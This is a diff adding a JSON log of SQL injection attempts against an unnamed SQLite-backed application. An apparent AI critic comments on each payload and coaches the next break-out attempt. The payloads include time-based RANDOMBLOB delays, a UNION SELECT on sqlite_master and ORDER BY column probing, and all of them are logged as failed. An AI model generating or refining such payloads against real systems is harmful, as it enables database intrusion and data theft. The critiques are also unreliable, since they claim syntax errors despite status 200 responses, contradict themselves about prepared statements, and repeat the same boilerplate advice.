@@ -1,0 +1,58 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) AND 1=1",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the application is using a LIKE operator with a hexadecimal string, which is causing a syntax error due to the presence of a single quote within the string. You are trapped inside a string, start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "1 AND 1=1",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "You are trapped inside a string. The payload \"1 AND 1=1\" failed to breach the SQLi vulnerability because it does not contain any syntax errors or unrecognized tokens, suggesting that the application is properly escaping the input or using prepared statements to prevent SQL injection.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) OR 1=1",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "You are trapped inside a string. The payload failed to breach the SQLi vulnerability because the presence of the single quote (') in the payload triggered a syntax error, indicating that the application is using a string literal for the 'username' field.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "1' UNION SELECT 1,2,3,4,5 FROM sqlite_master WHERE type='trigger';",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the UNION operator requires the SELECT statements to have the same number of result columns, which is not the case here. This indicates that the payload was executed within a string literal, and you are trapped inside a string; start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) AND 123=123 AND 1=1",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because it triggered a syntax error due to the presence of a single quote (') in the payload, which is not properly escaped within the string literal. You are trapped inside a string. Start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "1 ORDER BY 5",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "You are trapped inside a string. The payload '1 ORDER BY 5' failed to breach the SQLi vulnerability because it did not contain a syntax error or unrecognized token, indicating that the application successfully parsed the query.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 4,
+        "vuln_type": "sqli",
+        "payload": "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) AND 1=1",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the presence of the ' character within the LIKE function is being treated as a string literal delimiter, causing a syntax error. You are trapped inside a string. Start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    }
+]
